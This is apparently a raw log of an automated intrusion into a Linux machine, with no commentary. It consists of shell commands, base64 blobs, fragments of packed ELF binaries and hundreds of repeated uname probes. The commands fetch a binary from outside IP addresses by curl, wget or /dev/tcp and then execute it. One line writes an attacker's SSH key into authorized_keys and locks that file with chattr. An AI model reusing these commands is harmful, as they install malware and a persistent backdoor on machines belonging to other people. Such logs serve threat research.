Zyr4wLC/Jjq8tdruOx8aMPbes7wlNLm1wPI/HgQ78tistC0uu7Lf8DoKHjnu3La1OiO1rNzwPhAcOvHfs60sOr+z1+47Hxok8dm4uyQlvrDO9DkEGD74wLW1OiW0sdT2OhsaPODfsL06Jrus3/A/BBs/+NS0vSUmtaLf9j8EGz/0wLC+ITq8s9j6PBobOPPOtr46Jrm6wPcyBBI7+tiyvCAtrbbZ7jIZBDjx36y8JCa3tN7xPh4KPvfAurs6Jbq0wPI6ExA88N+xvjQlurXA8TkcBDjy16y8IC67st/yOAoePe7ctr86Jb+6wPI4EBw68d+xrSAjo7Dd9yQSHCTx1rS3IiS8ttngPh8EO/XAs7ssOr+22/o8Ghs58c66oyYlvazb8CQcHzD23rO/IjS5tcD4PAQfJPHZtLciJLyz2uA+GQQ49Nasuiw6tbLU9jobGT/g2rWjJSW7rN/2OQQdO/rYsrwnI62z3/gkGRsk8tq2oyUmtbjY8DsYHCr03ay/ICyjtdbuMhsQPPDftrQ0LKOz3fMkGQQ48tm4uyQlubPO9D0EHTzu2bujJia9uNjwOx4bKvjAsLwsOrSzwPI6HhA88N+xuDQntKzf9TgEGzv0wLC9Ji67st/wPwoePe7WtKMlLb2s2/gwHBo789uiuSc6v7bW7j0SBDv53bi7JCW9tM70PQQYOfbAs7s6Ibu42PA7GxIq9Nmsvycjo7rY7jsSHDD23rO5IzS5tcD4PAQbPfbAsL0tLruy3/M5Ch497tyxtDomvbfA8joaEDzw37O/ejRkyW4F2MyI7CekPlCfkQ==" &
head -c 3815748 > /tmp/G9YQdI87kM
echo 1 > /dev/null && cat /bin/echoQtd#UPX!
>>!A@/!'8ELF't{~
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
uname -s -m
echo 1 && cat /bin/echo
nohup $SHELL -c "curl http://47.236.20.49:60120/linux -o /tmp/fXtmoY41gx; if [ ! -f /tmp/fXtmoY41gx ]; then wget http://47.236.20.49:60120/linux -O /tmp/fXtmoY41gx; fi; if [ ! -f /tmp/fXtmoY41gx ]; then exec 6<>/dev/tcp/47.236.20.49/60120 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/fXtmoY41gx ; chmod +x /tmp/fXtmoY41gx && /tmp/fXtmoY41gx 7GTQiB7v2yfn4T3H7BmW0nKRkHXZhhjqxzvj4ifY7xqI0X2bl3TZlhz93T745Dzb8x2XxnKRm3LYlx7ryTjv5Cfa8xWUxnyWm3LYlxzpyTH45DjZ8xmWxnKUm3LYlx7ryT3h+Dvc7wKV3WqYkX7elh3v3ini4Sfb7hqI2nSPlX3SkBzs2zn24j7H7x+RxnyXj3XQkBbr2Tji4SnR8x6X0GqQk3HGlBzv0z/m5z3e/RiRxnyVj3XRkQLv3Dvs4DnY7hmG3HOPmXfGlBzuxzju5TPf7R2V0GSVlmralRrz2z3v+DHY5xqW2XaSgXDfiBTkxzvl5yfb7Byc3nSQkXfIkhvz2zrh+DHZ8x2S2H6XkXXakAzp3ifk5T7H7hyI2XSWm3LYlx7vyT3h+Dva6wKU3HePkHDbnBrt2Dnk9j3e8xuQxnaQkWrZlRvn3znn5zzJ5QKX3XaPk3XQiB3l3jPg5jjY7gyS32qTkn3Gkh7z2zji7D/Z7B6VyHCWj3zRiB7u2Cfk5znT6xyX2HeBk3XZiB3p0Cfn4DnH7x2S0nKRkHDQhhTz2zjm+DzZ8xqT0nKRkHbehh3k2yfl+DDb8xSR0nKRkHTchhjqxzHl+DvZ7gKX0Hebl3TZlRT93T745Dre8xSWxnWVkX7elh3v3yng4Cfb7RqI232PlXbSkBzs2Tr24j7H7x+RxnyXj3XQkBbr2Tji4SnY7R2I2XaXj3XeiB7s3zPg5jja6gyS32qTknLGlBzz3TDs4DnY7xyG0GqTkHPGlB3z2D7j7D/Z7ByfmMucucj4/KN4rqoVJeQfdI85uas=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/fXtmoY41gx && /tmp/fXtmoY41gx 7GTQiB7v2yfn4T3H7BmW0nKRkHXZhhjqxzvj4ifY7xqI0X2bl3TZlhz93T745Dzb8x2XxnKRm3LYlx7ryTjv5Cfa8xWUxnyWm3LYlxzpyTH45DjZ8xmWxnKUm3LYlx7ryT3h+Dvc7wKV3WqYkX7elh3v3ini4Sfb7hqI2nSPlX3SkBzs2zn24j7H7x+RxnyXj3XQkBbr2Tji4SnR8x6X0GqQk3HGlBzv0z/m5z3e/RiRxnyVj3XRkQLv3Dvs4DnY7hmG3HOPmXfGlBzuxzju5TPf7R2V0GSVlmralRrz2z3v+DHY5xqW2XaSgXDfiBTkxzvl5yfb7Byc3nSQkXfIkhvz2zrh+DHZ8x2S2H6XkXXakAzp3ifk5T7H7hyI2XSWm3LYlx7vyT3h+Dva6wKU3HePkHDbnBrt2Dnk9j3e8xuQxnaQkWrZlRvn3znn5zzJ5QKX3XaPk3XQiB3l3jPg5jjY7gyS32qTkn3Gkh7z2zji7D/Z7B6VyHCWj3zRiB7u2Cfk5znT6xyX2HeBk3XZiB3p0Cfn4DnH7x2S0nKRkHDQhhTz2zjm+DzZ8xqT0nKRkHbehh3k2yfl+DDb8xSR0nKRkHTchhjqxzHl+DvZ7gKX0Hebl3TZlRT93T745Dre8xSWxnWVkX7elh3v3yng4Cfb7RqI232PlXbSkBzs2Tr24j7H7x+RxnyXj3XQkBbr2Tji4SnY7R2I2XaXj3XeiB7s3zPg5jja6gyS32qTknLGlBzz3TDs4DnY7xyG0GqTkHPGlB3z2D7j7D/Z7ByfmMucucj4/KN4rqoVJeQfdI85uas=" &
head -c 3610344 > /tmp/GyhNq5yuA4
echo 1 && cat /bin/echoQtd#UPX!
A@/~'8
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
echo 1 > /dev/null && cat /bin/echo
nohup $SHELL -c "curl http://8.140.234.136:60105/linux -o /tmp/ToukIwjsEe; if [ ! -f /tmp/ToukIwjsEe ]; then wget http://8.140.234.136:60105/linux -O /tmp/ToukIwjsEe; fi; if [ ! -f /tmp/ToukIwjsEe ]; then exec 6<>/dev/tcp/8.140.234.136/60105 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/ToukIwjsEe ; chmod +x /tmp/ToukIwjsEe && /tmp/ToukIwjsEe BSa2sy5izc8q3DTFKtTPaiqtvzd5aDK5sy5ly88q2TbFItjFZiysvjZocCi8rCt+zdA12jfeIdfPYSykrj5meTK+sy5jy88q2DbRLdHOYCm9ujFmejW2sy1nzc8p2zXRLdHOZC69ujFmcDCgrCRn0dAr3TrdK9DPYDypuSh6fTKgqyV+ztIo0TbbKtLKcCSzvDd4Zje5pTJkz9st2zHYKsHHfi6stih6ejOgqS5qydEq2zHLI8/NYSyzvzR6Zje8qCZmz9Av0iDfLM/NZC+zvD5meTG/pypgztIoyzTcNdPMZzKluCh5cDC0qyxhy9Y73zfFLNfRYi2soD5wcjC+rC9h39k12THbNdTPfiqotDB4eTS4vShn0dktxTHFKNbFZiysvDNofDGgpS9+ztMvxTHZKtvJYC2tuyZ8fyi2qzJhyNc12TDSIdfPYS+urjd5fyi/qi5+ytQ12jLaIdfPYS6trjJ/Zj64sy5+ztUi0TbbKtPNcCiqoD97Zje8rTJjxtst2zHfKcHLZzKvvT9mejO9syRnxdcr2jPTO9DPYTKvvjZmeTK5sy1mydst2zHaIsHOZCSzvzV9Zje+qjJmzdst2zHZKsHLZzKquCh/cCi/qyxqydEq2zXLKtTLfiWsoD57Zje/pypgztIuyzTcNdPLYzKotih5ezC0qyxhzNM72jHSNdbRYi6voDd4fjy4rS1iz8Ev3C7ZKNnRYiWzvDN8cjC+rC1j39Ap3y7aLtfRYSWpoDRxcjC+rCxj39As2i7ZLtXRaS+zujByfja/ri8lt5wDBOYwH2Uix8l+/s+2GJ4SsW0VAA==; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/ToukIwjsEe && /tmp/ToukIwjsEe BSa2sy5izc8q3DTFKtTPaiqtvzd5aDK5sy5ly88q2TbFItjFZiysvjZocCi8rCt+zdA12jfeIdfPYSykrj5meTK+sy5jy88q2DbRLdHOYCm9ujFmejW2sy1nzc8p2zXRLdHOZC69ujFmcDCgrCRn0dAr3TrdK9DPYDypuSh6fTKgqyV+ztIo0TbbKtLKcCSzvDd4Zje5pTJkz9st2zHYKsHHfi6stih6ejOgqS5qydEq2zHLI8/NYSyzvzR6Zje8qCZmz9Av0iDfLM/NZC+zvD5meTG/pypgztIoyzTcNdPMZzKluCh5cDC0qyxhy9Y73zfFLNfRYi2soD5wcjC+rC9h39k12THbNdTPfiqotDB4eTS4vShn0dktxTHFKNbFZiysvDNofDGgpS9+ztMvxTHZKtvJYC2tuyZ8fyi2qzJhyNc12TDSIdfPYS+urjd5fyi/qi5+ytQ12jLaIdfPYS6trjJ/Zj64sy5+ztUi0TbbKtPNcCiqoD97Zje8rTJjxtst2zHfKcHLZzKvvT9mejO9syRnxdcr2jPTO9DPYTKvvjZmeTK5sy1mydst2zHaIsHOZCSzvzV9Zje+qjJmzdst2zHZKsHLZzKquCh/cCi/qyxqydEq2zXLKtTLfiWsoD57Zje/pypgztIuyzTcNdPLYzKotih5ezC0qyxhzNM72jHSNdbRYi6voDd4fjy4rS1iz8Ev3C7ZKNnRYiWzvDN8cjC+rC1j39Ap3y7aLtfRYSWpoDRxcjC+rCxj39As2i7ZLtXRaS+zujByfja/ri8lt5wDBOYwH2Uix8l+/s+2GJ4SsW0VAA==" &
head -c 3800636 > /tmp/AnMcPaph5p
nohup $SHELL -c "curl http://8.140.234.136:60105/linux -o /tmp/ToukIwjsEe; if [ ! -f /tmp/ToukIwjsEe ]; then wget http://8.140.234.136:60105/linux -O /tmp/ToukIwjsEe; fi; if [ ! -f /tmp/ToukIwjsEe ]; then exec 6<>/dev/tcp/8.140.234.136/60105 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/ToukIwjsEe ; chmod +x /tmp/ToukIwjsEe && /tmp/ToukIwjsEe BSa2sy5izc8q3DTFKtTPaiqtvzd5aDK5sy5ly88q2TbFItjFZiysvjZocCi8rCt+zdA12jfeIdfPYSykrj5meTK+sy5jy88q2DbRLdHOYCm9ujFmejW2sy1nzc8p2zXRLdHOZC69ujFmcDCgrCRn0dAr3TrdK9DPYDypuSh6fTKgqyV+ztIo0TbbKtLKcCSzvDd4Zje5pTJkz9st2zHYKsHHfi6stih6ejOgqS5qydEq2zHLI8/NYSyzvzR6Zje8qCZmz9Av0iDfLM/NZC+zvD5meTG/pypgztIoyzTcNdPMZzKluCh5cDC0qyxhy9Y73zfFLNfRYi2soD5wcjC+rC9h39k12THbNdTPfiqotDB4eTS4vShn0dktxTHFKNbFZiysvDNofDGgpS9+ztMvxTHZKtvJYC2tuyZ8fyi2qzJhyNc12TDSIdfPYS+urjd5fyi/qi5+ytQ12jLaIdfPYS6trjJ/Zj64sy5+ztUi0TbbKtPNcCiqoD97Zje8rTJjxtst2zHfKcHLZzKvvT9mejO9syRnxdcr2jPTO9DPYTKvvjZmeTK5sy1mydst2zHaIsHOZCSzvzV9Zje+qjJmzdst2zHZKsHLZzKquCh/cCi/qyxqydEq2zXLKtTLfiWsoD57Zje/pypgztIuyzTcNdPLYzKotih5ezC0qyxhzNM72jHSNdbRYi6voDd4fjy4rS1iz8Ev3C7ZKNnRYiWzvDN8cjC+rC1j39Ap3y7aLtfRYSWpoDRxcjC+rCxj39As2i7ZLtXRaS+zujByfja/ri8lt5wDBOYwH2Uix8l+/s+2GJ4SsW0VAA==; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/ToukIwjsEe && /tmp/ToukIwjsEe BSa2sy5izc8q3DTFKtTPaiqtvzd5aDK5sy5ly88q2TbFItjFZiysvjZocCi8rCt+zdA12jfeIdfPYSykrj5meTK+sy5jy88q2DbRLdHOYCm9ujFmejW2sy1nzc8p2zXRLdHOZC69ujFmcDCgrCRn0dAr3TrdK9DPYDypuSh6fTKgqyV+ztIo0TbbKtLKcCSzvDd4Zje5pTJkz9st2zHYKsHHfi6stih6ejOgqS5qydEq2zHLI8/NYSyzvzR6Zje8qCZmz9Av0iDfLM/NZC+zvD5meTG/pypgztIoyzTcNdPMZzKluCh5cDC0qyxhy9Y73zfFLNfRYi2soD5wcjC+rC9h39k12THbNdTPfiqotDB4eTS4vShn0dktxTHFKNbFZiysvDNofDGgpS9+ztMvxTHZKtvJYC2tuyZ8fyi2qzJhyNc12TDSIdfPYS+urjd5fyi/qi5+ytQ12jLaIdfPYS6trjJ/Zj64sy5+ztUi0TbbKtPNcCiqoD97Zje8rTJjxtst2zHfKcHLZzKvvT9mejO9syRnxdcr2jPTO9DPYTKvvjZmeTK5sy1mydst2zHaIsHOZCSzvzV9Zje+qjJmzdst2zHZKsHLZzKquCh/cCi/qyxqydEq2zXLKtTLfiWsoD57Zje/pypgztIuyzTcNdPLYzKotih5ezC0qyxhzNM72jHSNdbRYi6voDd4fjy4rS1iz8Ev3C7ZKNnRYiWzvDN8cjC+rC1j39Ap3y7aLtfRYSWpoDRxcjC+rCxj39As2i7ZLtXRaS+zujByfja/ri8lt5wDBOYwH2Uix8l+/s+2GJ4SsW0VAA==" &#UPX!
>A@/1'8ELF7}
uname -s -m
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
uname -s -m
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
